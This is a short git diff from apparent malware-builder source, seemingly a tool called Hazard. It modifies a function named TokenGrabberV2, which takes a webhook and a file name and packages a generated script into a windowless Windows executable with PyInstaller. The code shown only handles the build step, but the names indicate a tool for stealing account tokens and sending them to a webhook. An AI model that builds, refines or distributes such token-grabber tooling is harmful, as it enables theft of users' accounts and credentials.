@@ -8,7 +8,6 @@ import Hazard
 import requests
 import base64
 import random
-import PyInstaller.__main__
 
 from Crypto.Cipher import AES
 from Crypto import Random
@@ -53,17 +52,8 @@ def TokenGrabberV2(WebHook, fileName):
 
     print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
     setTitle(f"Creating {fileName}.exe")
-    #the equivalent to "pyinstaller {fileName}.py -n {fileName} --onefile --noconsole --log-level=INFO -i NONE"
-    # PyInstaller.__main__.run([
-    #     '%s.py' % fileName,
-    #     '--name=%s' % fileName,
-    #     '--onefile',
-    #     '--clean',
-    #     '--noconsole',
-    #     '--log-level=INFO',
-    #     '--icon=NONE',
-    # ])
-    os.system(f"pyinstaller --onefile --noconsole --clean --log-level=INFO -i NONE -n {fileName} {fileName}.py")
+
+    os.system(f"pyinstaller --onefile --noconsole --log-level=INFO -i NONE -n {fileName} {fileName}.py")
     try:
         #clean build files
         shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
